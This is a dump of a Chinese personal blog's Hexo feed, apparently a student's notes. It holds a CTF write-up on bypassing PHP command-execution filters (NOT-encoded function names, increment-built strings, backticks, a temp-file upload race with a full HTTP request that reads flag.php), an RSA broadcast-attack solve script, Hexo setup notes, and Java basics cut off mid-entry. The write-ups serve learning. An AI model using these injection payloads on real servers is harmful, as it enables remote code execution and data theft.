class="headerlink" title="PHP中的取反"></a>PHP中的取反</h2><p><strong>取反</strong>（~） 属于按位逻辑运算符，属于一元运算符，其本质其实就是将数据每一位按位取反，即将0变成1，将1变成0； 1、</p><pre><code class="php">&lt;?php$a=urlencode(~&#39;phpinfo&#39;);echo $a;echo &#39;&lt;/br&gt;&#39;;$b=~urldecode($a);echo $b;//需要注意的是，可能Payload中会含有一些特殊字符，需要对Payload进行一次URL编码</code></pre><p>输出</p><pre><code class="php">%8F%97%8F%96%91%99%90&lt;/br&gt;phpinfo</code></pre><p>payload:</p><pre><code class="php">(~%8F%97%8F%96%91%99%90)();</code></pre><p>等价于</p><pre><code class="php">phpinfo();</code></pre><p>对于一个汉字进行<del>($x{0})或</del>($x{1})或~($x{2})的操作，可以得到某个ASCII码的字符值</p><blockquote><p>PHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();</p></blockquote><h2 id="PHP中的自增"><a href="#PHP中的自增" class="headerlink" title="PHP中的自增"></a>PHP中的自增</h2><p>在异或的例子里我们发现</p><p><strong>我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字0</strong></p><p>$_++对_变量进行了自增操作,由于我们没有定义_的值,PHP会给_赋一个默认值NULL&#x3D;&#x3D;0</p><p>也就是说，如果我们能够得到”A”，那么我们就能通过自增自减，得到所有的字母。 那么问题就转化为怎么得到一个字符”A”。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”。</p><p>再取这个字符串的第一个字母，就可以获得”A”。</p><pre><code class="php">&lt;?php$a = &#39;&#39;.[];var_dump($a);</code></pre><pre><code class="php">&lt;?php$_=[].&#39;&#39;;   //得到&quot;Array&quot;$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;$__ = $___;   //$__=&quot;A&quot;$_ = $___;   //$_=&quot;A&quot;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;$___ .= $__;   //$___=&quot;AS&quot;//类似这个过程</code></pre><h2 id="PHP中的短标签"><a href="#PHP中的短标签" class="headerlink" title="PHP中的短标签"></a>PHP中的短标签</h2><p>PHP中有两种短标签</p><pre><code class="php">&lt;??&gt;和&lt;?=?&gt;</code></pre><p>其中</p><pre><code class="php">&lt;??&gt;相当于对&lt;?php&gt;的替换</code></pre><p>而</p><pre><code class="php">&lt;?=?&gt;则是相当于&lt;? echo?&gt;</code></pre><p>例如:</p><pre><code class="php">&lt;?= &#39;111&#39;?&gt;    //等价&lt;? echo(&#39;111&#39;);?&gt;        </code></pre><pre><code class="php">&lt;??&gt;</code></pre><p>这种写法则需要short_open_tag开启才行。</p><pre><code class="php">所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。 闭合之后就相当于&lt;?php?&gt;&lt;?=`ls`;</code></pre><h2 id="PHP中的反引号"><a href="#PHP中的反引号" class="headerlink" title="PHP中的反引号"></a>PHP中的反引号</h2><p>反引号可以起到命令执行的作用</p><pre><code class="php">&lt;?php$_=`whoami`;echo $_;</code></pre><p>可以执行whoami</p><p>与短标签相利用可以写成</p><pre><code class="php">&lt;?= `whoami`?&gt;</code></pre><h2 id="PHP中的临时文件"><a href="#PHP中的临时文件" class="headerlink" title="PHP中的临时文件"></a>PHP中的临时文件</h2><p>一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是随机生成的有大小写。</p><p>&#x2F;&#x2F;具体看web56</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>基本思路就是</p><p><strong>用其他字符构造出相关字符如ls cat 进而执行函数</strong></p><h2 id="ctfshow-命令执行-55"><a href="#ctfshow-命令执行-55" class="headerlink" title="ctfshow-命令执行-55"></a>ctfshow-命令执行-55</h2><pre><code class="php"> &lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>过滤</p><pre><code class="php">preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)</code></pre><ul><li>i表示不区分大小写</li><li><code>\;</code>：匹配分号”;”。</li><li><code>[a-z]</code>：匹配任意小写字母。</li><li><code>\`` </code>:匹配反引号”&#96;”。</li><li><code>\%</code>：匹配百分号”%”。</li><li><code>\x09</code>：匹配水平制表符。</li><li><code>\x26</code>：匹配”&amp;”符号。</li><li><code>\&gt;</code>：匹配大于号”&gt;”。</li><li><code>\&lt;</code>：匹配小于号”&lt;”。</li></ul><h3 id="法一，法二和56做法一样"><a href="#法一，法二和56做法一样" class="headerlink" title="法一，法二和56做法一样"></a>法一，法二和56做法一样</h3><p>&#x2F;bin目录下存放了大部分可执行的命令</p><p>其中有一个命令为base64，</p><p>在linux里面就是将打印输出的字符转化为base64编码.</p><p>我们构造?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p><p>前三个问号是&#x2F;bin，然后base64 最后是flag.php</p><p>会自己匹配</p><h2 id="web-56"><a href="#web-56" class="headerlink" title="web-56"></a>web-56</h2><h3 id="没有被过滤"><a href="#没有被过滤" class="headerlink" title=".没有被过滤"></a>.没有被过滤</h3><p>可以尝试 临时文件</p><blockquote><p>我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过 . (点)去执行执行这个文件。(形成了条件竞争)。</p><p>一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br>!:通过.去执行sh命令不需要有执行权限</p><p>bin&#x2F;</p></blockquote><p>.运行sh文件</p><pre><code class="php"> &lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>数字字母全无</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://bd10d287-7dfb-45c9-87d8-00d7146ce421.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>访问这个html然后 上传一个php文件</p><p><strong>构造poc执行命令</strong></p><p><code>?c=.+/???/????????[@-[]</code><br> 注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。</p><p>为什么可以这样执行呢？</p><p>因为在linux里，如果一个文件里有命令，是可以通过这个文件名执行命令的，这里我们相当于使用临时文件执行了命令</p><p><img src="/img/image-20230605180037632.png"></p><p>然后把上传文件的内容改为</p><pre><code class="bash">#!/bin/shls</code></pre><pre><code>POST /?c=.%20/???/????????[@-[] HTTP/1.1Host: bd10d287-7dfb-45c9-87d8-00d7146ce421.challenge.ctf.showUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------1702859319697226373409551389Content-Length: 382Origin: nullConnection: closeUpgrade-Insecure-Requests: 1-----------------------------1702859319697226373409551389Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: application/octet-stream#!/bin/shcat /var/www/html/flag.php-----------------------------1702859319697226373409551389Content-Disposition: form-data; name=&quot;submit&quot;鎻愪氦-----------------------------1702859319697226373409551389--</code></pre><p><img src="/img/image-20230605180118443.png"></p><p>多发几次包,有时可能匹配不到</p><p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">参考1</a></p><p><a href="https://xz.aliyun.com/t/8107">参考2</a> </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fluid</title>
      <link href="/2023/07/17/fluid/"/>
      <url>/2023/07/17/fluid/</url>
      
        <content type="html"><![CDATA[<h1 id="Fluid"><a href="#Fluid" class="headerlink" title="Fluid"></a>Fluid</h1><p>这个主题网上挺多人用的，官方文档介绍的也很清楚</p><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><p><a href="https://hexo.fluid-dev.com/">https://hexo.fluid-dev.com/</a></p><h3 id="官方文档用户手册"><a href="#官方文档用户手册" class="headerlink" title="官方文档用户手册"></a>官方文档用户手册</h3><p><a href="https://hexo.fluid-dev.com/docs/guide/#%E5%85%B3%E4%BA%8E%E6%8C%87%E5%8D%97">https://hexo.fluid-dev.com/docs/guide/#%E5%85%B3%E4%BA%8E%E6%8C%87%E5%8D%97</a></p><h2 id="一些自定义js"><a href="#一些自定义js" class="headerlink" title="一些自定义js"></a>一些自定义js</h2><p><a href="https://cloud.tencent.com/developer/article/2142662">https://cloud.tencent.com/developer/article/2142662</a></p><h2 id="一个看板娘项目"><a href="#一个看板娘项目" class="headerlink" title="一个看板娘项目"></a>一个看板娘项目</h2><p><a href="https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md">https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md</a></p><h2 id="如何放本地图片"><a href="#如何放本地图片" class="headerlink" title="如何放本地图片"></a>如何放本地图片</h2><p><a href="https://blog.csdn.net/kai_99/article/details/125557840">https://blog.csdn.net/kai_99/article/details/125557840</a></p><h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><p><a href="https://blog.csdn.net/to_free/article/details/108784006?spm=1001.2014.3001.5501">https://blog.csdn.net/to_free/article/details/108784006?spm=1001.2014.3001.5501</a></p><p><img src="/img/lei.png"></p>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Github</title>
      <link href="/2023/07/17/hexo/"/>
      <url>/2023/07/17/hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="记一下hexo-github建站"><a href="#记一下hexo-github建站" class="headerlink" title="记一下hexo+github建站"></a>记一下hexo+github建站</h1><p>win环境建站</p><h2 id="1、nodejs"><a href="#1、nodejs" class="headerlink" title="1、nodejs"></a>1、nodejs</h2><p>首先，安装 nodejs， Hexo是基于 Node.js 驱动的一款博客框架</p><p><strong><a href="http://nodejs.cn/">http://nodejs.cn</a></strong></p><h2 id="2、git-环境"><a href="#2、git-环境" class="headerlink" title="2、git 环境"></a>2、git 环境</h2><p>然后，安装git, 一个分布式版本控制系统，用于项目的版本控制管理，作者是 Linux 之父。</p><p>⭐Git（官网）<strong><a href="https://git-scm.com/">https://git-scm.com/</a></strong></p><p>太慢的话可以自行找资源 </p><pre><code>安装过程一路next就行（安装路径可改）两者安装完成之后，右击此电脑&gt;属性&gt;高级系统设置&gt;环境变量&gt;系统变量下的Path 可以看到两者已自动修改了环境变量，这是我们可以通过cmd命令（win+r后输入cmd）查看两者版本。(确认是否安装成功及可以使用) 查看Node.js版本命令：node -v 查看Git版本命令：git --version</code></pre><h2 id="3-之后进入GitHub创建一个仓库"><a href="#3-之后进入GitHub创建一个仓库" class="headerlink" title="3.之后进入GitHub创建一个仓库"></a>3.之后进入GitHub创建一个仓库</h2><blockquote><p><strong>确认注册后会让用户选择公有还是私有仓库(私有的个人仓库好像需要Money好像是每月7美金)</strong><br><strong>个人博客的话直接选免费的就行了</strong><br><strong>注意仓库的取名格式：用户名.github.io(这将是以后的访问域名)</strong></p></blockquote><blockquote><p><strong>到这里代表我们Github账号以及仓库都已经创建完毕</strong><br><strong>可以把下面这段仓库的地址复制下来留着后面配置时会用到</strong></p></blockquote><h2 id="4-接下来进入本地配置安装Hexo"><a href="#4-接下来进入本地配置安装Hexo" class="headerlink" title="4. 接下来进入本地配置安装Hexo"></a>4. 接下来进入本地配置安装Hexo</h2><p><strong>在磁盘中创建一个用来存放Github本地仓库文件的目录(可自定义目录存放，顾名思义blog&#x3D;&#x3D;博客)</strong></p><p>选中创建的目录(文件夹)右键选择使用Gti Bash Here打开Git命令窗口(这就是开始安装的Git工具，现在开始使用)<br>也可以使用Windows的cmd命令行(不推荐)<br>(因为是从国外服务器下载，受网络的影响比较大，有可能会出现异常，所以我们需要连接国内淘宝官方的服务器来进行)<br>输入命令：npm install -g cnpm –registry&#x3D;<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a><br>注：之后再次使用命令则是以cnpm开头~而不是npm</p><blockquote><p><strong>正式开始安装hexo</strong><br><strong>输入命令：cnpm install -g hexo-cli</strong></p></blockquote><blockquote><p><strong>之后就是初始化Hexo</strong><br><strong>输入命令：hexo init</strong></p></blockquote><p><strong>这时我们创建的目录(文件夹)下已经多出许多文件</strong></p><p>新建完成后，指定文件夹Hexo目录下有：</p><pre><code>node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：主题**_config.yml: 博客的配置文件**</code></pre><p>这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，</p><blockquote><p><strong>这时启动hexo之后在浏览器输入localhost:4000就可以在本地浏览博客(自带一篇Hello World博客)</strong><br><strong>输入命令：hexo s</strong><br><strong>关闭hexo ctrl + c</strong></p></blockquote><h2 id="5-设置ssh"><a href="#5-设置ssh" class="headerlink" title="5. 设置ssh"></a>5. 设置ssh</h2><blockquote><p><strong>生成sshkey</strong><br><strong>输入命令：cd ~&#x2F;.ssh进入.ssh文件</strong></p><p><strong>输入命令：ssh-keygen -t rsa -C ‘注册时的邮箱地址’</strong> </p></blockquote><p><strong>此时我们去查看C盘目录(此文件夹所在C:\用户\用户名目录下)</strong></p><p><strong>使用记事本打开id_rsa.put文件并复制生成的key</strong></p><p><strong>在已登陆的Github主页点击右侧头像 –&gt; Settings设置</strong></p><p>再点击SSH and GPG keys –&gt; New SSH key</p><p><strong>将刚刚在.ssh目录下所复制id_rsa.pub文件中的信息复制进key(注意空格)，在给它取个名字(随意)</strong></p><blockquote><p><strong>这里需要在本地进行验证一次</strong><br><strong>输入命令：ssh -T <a href="mailto:&#103;&#105;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#x6f;&#x6d;">&#103;&#105;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#x6f;&#x6d;</a> 并且输入yes之后，行末尾会显示你的用户名</strong></p></blockquote><p><strong>绑定成功并且会邮箱收到邮件</strong></p><blockquote><p><strong>接着在本地绑定与Github的用户名和邮箱</strong><br><strong>输入命令：git config –global user.name “注册时用户名”</strong><br><strong>输入命令：git config –global user.email “注册时邮箱”</strong></p></blockquote><h2 id="6-上传测试博客"><a href="#6-上传测试博客" class="headerlink" title="6. 上传测试博客"></a>6. 上传测试博客</h2><blockquote><p>打开并修改本地仓库目录下_config.yml文件</p></blockquote><blockquote><p><strong>在文件的末尾修改(repository属性的地址就是之前创建仓库后所保存的http地址)</strong><br>deploy:<br>type: git<br>repository: <a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/用户名/用户名.github.io.git</a></p><p>branch: master</p></blockquote><blockquote><p><strong>此时需要安装一个上传工具</strong><br><strong>输入命令：cnpm install hexo-deployer-git</strong></p></blockquote><blockquote><p><strong>可以新建一篇测试文章(不新建的话也会有一篇自带的Hello World文章)</strong><br><strong>输入命令：hexo new “文章名称”</strong></p></blockquote><blockquote><p><strong>新建文章之后需要生成一遍文件</strong><br><strong>输入命令：hexo g</strong></p></blockquote><blockquote><p><strong>新建文章后可在本地先预览一遍</strong><br><strong>输入命令：hexo s浏览器输入：localhost:4000(ctrl + c 关闭)</strong></p></blockquote><blockquote><p><strong>最后直接部署到Github就可以啦</strong><br><strong>输入命令：hexo d</strong></p></blockquote><h2 id="7-github绑定域名"><a href="#7-github绑定域名" class="headerlink" title="7.github绑定域名"></a>7.github绑定域名</h2><ol><li><p>前提，拥有一个自己的域名</p></li><li><p>创建CNAME文件。在GitHub上，进入需要绑定域名的项目设置，找到Custom  domain选项，添加域名后保存。在保存之前，确保在CNAME文件中填写的域名不包含<code>http://</code>和<code>www</code>。</p></li><li><p>例如，如果购买的域名是<code>example.com</code>，那么在CNAME文件中应填写<code>example.com</code>。13</p></li><li><p>修改域名解析记录。在购买域名的网站的控制台中，找到对应的域名，进行CNAME记录的修改。解析域名指向原来访问URL</p></li><li><p>等待DNS配置生效。DNS配置不是立即生效的，需要等待大约10分钟后再访问域名以确认配置是否成功。</p><p><a href="https://blog.csdn.net/weixin_40425640/article/details/129999245">可以参考</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低加密指数广播攻击</title>
      <link href="/2023/07/16/00-01/"/>
      <url>/2023/07/16/00-01/</url>
      
        <content type="html"><![CDATA[<p>（e&#x3D;111😭）</p><p>需要学学pwntools跟环境交互，不然手搓不知道得多久</p><blockquote><p>好消息</p><p>思路清晰</p><p>坏消息</p><p>脚本不会写</p></blockquote><p>接下来是正文</p><p><img src="/img/00-01.png"></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>首先是一个server.py</p><pre><code class="python">from libnum import s2n ,generate_primeflag = open(&#39;/flag&#39;,&#39;r&#39;).read().encode()e = 111m = s2n(flag)p = generate_prime(512)q = generate_prime(512)n = p*qc = pow(m, e, n)print(&#39;n =&#39;,n)print(&#39;c =&#39;,c)</code></pre><p>明显的是e很小，一开始思路是低指数加密，but 这个更小（一般为3）</p><p>还给了个在线环境</p><p>nc url:port</p><p>想了半天没搞明白，</p><p>后来学长提示这样可以获取任意组n和c</p><p>意味着有多组 n、c不同，but明文m，e相同，也就是低加密指数广播攻击</p><h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p><img src="/img/00-01-1.png"></p><p>附赠一个脚本加一个<a href="https://blog.csdn.net/ChaoYue_miku/article/details/125767969">blog</a></p><p>以及<a href="http://note.shenghuo2.top/01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/">生蚝✌养殖场</a></p><pre><code class="python">import gmpy2from functools import reducefrom Crypto.Util.number import long_to_bytes# 中国剩余定理的算法def CRT(cipher, n):    N = reduce(lambda x, y: x * y, (i for i in n))    result = 0    data = zip(cipher, n)    for ci, ni in data:        Ni = N // ni        di = gmpy2.invert(Ni, ni)        result += ci * Ni * di    return result % N, N# 读入 e, n, ce = 111#这里e看题目，如果给了按给的，比如本题就是111,如果没给就是n和c的组数n = []c = []x, N = CRT(c, n)m = gmpy2.iroot(gmpy2.mpz(x), e)[0]print(m)print(long_to_bytes(m))</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>与一般不同点在于e取111,也就是说，如果手搓111次的话（<del>也不是不行，甚至以我写脚本的速度还要稍微快一点</del>）</p><p>but当e三四百的时候就很寄，能学写脚本，谁愿意当脚本小子呢</p><p>我们这里可以用到pwntools的环境交互（学习的时候遇到了其他的交互，但是pwntools对于ctfer用的还是比较多的，就学了pwntools，毕竟对于一个pwn手来说pwntools是基操）</p><pre><code>remote(&#39;url&#39;,port)#远程交互并且函数返回给remote对象，我们可以赋值给a。eg:a=remotr(&#39;url&#39;,port)</code></pre><p>接下俩可以用send或recv操作</p><blockquote><ul><li><code>send(payload)</code> 发送payload</li><li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li><li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li><li><code>recvn(N)</code> 接受 N(数字) 字符</li><li><code>recvline()</code> 接收一行输出</li><li><code>recvlines(N)</code> 接收 N(数字) 行输出</li><li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li></ul></blockquote><p>这里是返回一行n&#x3D;什么什么和一行c&#x3D;什么什么</p><p>可以用如下来分别接受两行，用来区分开n和c然后利用上面的脚本解题</p><pre><code class="python">line1 = a.recvline()line2 = a.recvline()</code></pre><p>还有一些微操去调整数据格式，以便于符合脚本就不多说了（<del>当然不是懒得改脚本了</del>）😖</p><h3 id="😵‍💫最终exp"><a href="#😵‍💫最终exp" class="headerlink" title="😵‍💫最终exp"></a>😵‍💫最终exp</h3><pre><code class="python">from pwn import *import gmpy2from functools import reducefrom Crypto.Util.number import long_to_bytesn=[]c=[]for i in range(111):    conn = remote(&quot;url&quot;,10000)    line1 = conn.recvline()    data1 = line1.strip()    new1=str(data1)[6:-1]    n.append(int(new1))    line2 = conn.recvline()    data2 = line2.strip()    new2=str(data2)[6:-1]    c.append(int(new2))    conn.close()def CRT(cipher, n):    N = reduce(lambda x, y: x * y, (i for i in n))    result = 0    data = zip(cipher, n)    for ci, ni in data:        Ni = N // ni        di = gmpy2.invert(Ni, ni)        result += ci * Ni * di    return result % N, Ne = 111x, N = CRT(c, n)m = gmpy2.iroot(gmpy2.mpz(x), e)[0]print(m)print(long_to_bytes(m))</code></pre><h3 id="Sage-exp"><a href="#Sage-exp" class="headerlink" title="Sage exp"></a>Sage exp</h3><pre><code class="python">from Crypto.Util.number import *from pwn import *from tqdm import trangen = []c = []for i in trange(111):    io = remote(&#39;url&#39;, &#39;10000&#39;)    n.append(eval(io.recvline().decode()[3:]))    c.append(eval(io.recvline().decode()[3:]))    io.close()    sleep(0.1)e = 111ms = crt(c, n)R.&lt;x&gt; = PolynomialRing(ZZ)f = x^e - msm = f.roots()[0][0]print(long_to_bytes(m))</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> CRYPTO </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>萌新</title>
      <link href="/2023/07/16/hello-world/"/>
      <url>/2023/07/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome😋</p>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> life </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaStudy</title>
      <link href="/2023/07/16/javabase/"/>
      <url>/2023/07/16/javabase/</url>
      
        <content type="html"><![CDATA[<h1 id="Java基础学习"><a href="#Java基础学习" class="headerlink" title="Java基础学习"></a>Java基础学习</h1><p><a href="https://javasec.org/">文字版</a></p><p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be">视频版</a></p><h1 id="强类型语言"><a href="#强类型语言" class="headerlink" title="强类型语言"></a>强类型语言</h1><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><h3 id="八大基本类型"><a href="#八大基本类型" class="headerlink" title="八大基本类型"></a>八大基本类型</h3><pre><code class="java">public class Demo01 &#123;    public static void main(String[] args) &#123;        //八大基本类型        //整形        int num =1000;//最常用        byte num2=111;        short num3=12345;        long num4=123312312321L;//long 在最后要加L        //小数        float num5=1.1F;//float在最后要加F        double num6=3.121314124174612;        //字符        char name=&#39;菜&#39;;        //字符串        //String name2=&quot;菜菜站&quot;;//不是关键字        //布尔类型        boolean flag=true;    &#125;&#125;</code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><pre><code class="java">import java.math.BigDecimal;public class Demo02 &#123;    public static void main(String[] args) &#123;        //整数扩展:  进制        //二进制0b  十进制  八进制0  十六进制0x        int i =10;//十进制        int i2=010;        int i3=0x15;//十六进制        System.out.println(i);        System.out.println(i2);        System.out.println(i3);        //浮点数扩展        //BigDecimal        //float 有限 离散 舍入误差 大约 接近但不等于        float d1=0.1f;        double d2=1.0/10;        System.out.println(d1==d2);//flase        //字符扩展        //unicode 表 97=a        char c1=&#39;a&#39;;        char c2=&#39;中&#39;;        System.out.println(c1);//a        System.out.println((int)c1);//97        //转移字符        // \t 制表符        // \n 换行符        System.out.println(&quot;Hello\tWorld&quot;);//HelloWorld        //对象        String s1 =new String(&quot;hello world&quot;);        String s2 =new String(&quot;hello world&quot;);        System.out.println(s1==s2);//false        System.out.println(&quot;===============================&quot;);        String s3 =&quot;hello world&quot;;        String s4 =&quot;hello world&quot;;        System.out.println(s3==s4);//true        //布尔值扩展        boolean flag=true;        //if (flag==true)&#123;&#125;        if (flag)&#123;&#125;            &#125;&#125;</code></pre><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><strong>先统一类型再运算</strong></p><pre><code class="java">public class Demo03 &#123;    public static void main(String[] args) &#123;        int i=111;        byte b= (byte) i;//强制转化        System.out.println(b);    &#125;&#125;</code></pre><ul><li>不能转换布尔类型</li><li>不能转化为不相干的</li><li>高容量转化为低容量的时候，需要强制转换</li><li>可能出现内存溢出情况，或者精度问题</li></ul><p>JDK7<strong>开始新特性</strong></p><p>数字可以用下划线分割，切下滑线不会被分割</p><p>123_213_1231213&#x3D;&#x3D;1232131231213</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量须要声明类型</p><p>局部变量&#x2F;&#x2F;从属于main方法</p><p>实例变量&#x2F;&#x2F;从属于对象</p><p>类变量&#x2F;&#x2F;static</p><p>常量&#x2F;&#x2F;flnal，一般大写字符</p><pre><code class="jave">public class Demo04 &#123;    static String CCG=&quot;cai&quot;;//类变量，从属于类，可以直接调用，不需要实例化    int a;//实例变量，不设置输出默认值，需要先实例化     //修饰符不区分前后位置static final或者final static都可    static final double PI =3.14;//常量，static final（常量修饰符）    //    ==默认值    //int类型为0    //布尔为false    //除了基本类型都是null    public static void main(String[] args) &#123;        int a,b,c;//局部变量        String name;        Demo04 demo04=new Demo04();        System.out.println(demo04.a);//实例变量输出方式                //类变量        System.out.println(CCG);    &#125;&#125;</code></pre><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><pre><code class="java">//运算符public class Demo08 &#123;    public static void main(String[] args) &#123;        // 与c类似        //&amp;&amp; || ！与或非            &#125;    &#125;</code></pre><h3 id="自增自减"><a href="#自增自减" class="headerlink" title="自增自减"></a>自增自减</h3><pre><code class="java">package operator;public class Demo02 &#123;    public static void main(String[] args) &#123;        //自增自减        int a=1;        int b=a++;        //a++ a=a+1;先给b赋值再自增                System.out.println(a);        System.out.println(b);        //++a a=a+1;先自增再给c赋值        int c=++a;        System.out.println(a);        System.out.println(c);        //幂运算        double pow=Math.pow(2, 3);        System.out.println(pow);    &#125;    &#125;</code></pre><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><pre><code class="java">package operator;public class Demo03 &#123;    public static void main(String[] args) &#123;        //与and 或 or 非（取反        boolean a= true;        boolean b= false;        System.out.println(&quot;a % b&quot;+(a&amp;&amp;b));//与        System.out.println(&quot;a||b&quot;+(a||b));//或        System.out.println(&quot;!(a%b)&quot;+!(a&amp;&amp;b));//非        //位运算        /*         *          * A= 0011 1100         * B= 0000 1101         *          * A&amp;B = 0000 1100         * A|B= 0011 1101         * A^B= 0011 0001         * ~B=1111 0010         0000 0000  0        0000 0001  1        0000 0010  2        0000 0011  3        0000 0010  2        2&lt;&lt;3后        0001 0000  16         *          */        System.out.println(2&lt;&lt;3);        int p=10;        int q=20;        //拼接符        System.out.println(&quot;&quot;+p+q);        System.out.println(p+q+&quot;&quot;);        // 1020        // 30                                //三元运算符        //x ? y : z        //如果x为true 则为y否则为z    &#125;    &#125;</code></pre><h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><p>没什么意思，导入包和包的命名</p><h2 id="jdk帮助文档"><a href="#jdk帮助文档" class="headerlink" title="jdk帮助文档"></a>jdk帮助文档</h2><p><a href="https://docs.oracle.com/javase/8/docs/api/">https://docs.oracle.com/javase/8/docs/api/</a></p><p>以及自己写自己的文档</p><h1 id="java流程控制"><a href="#java流程控制" class="headerlink" title="java流程控制"></a>java流程控制</h1><h2 id="用户交互Scanner"><a href="#用户交互Scanner" class="headerlink" title="用户交互Scanner"></a>用户交互Scanner</h2><p><strong>获取输入</strong></p><pre><code class="java">Scanner 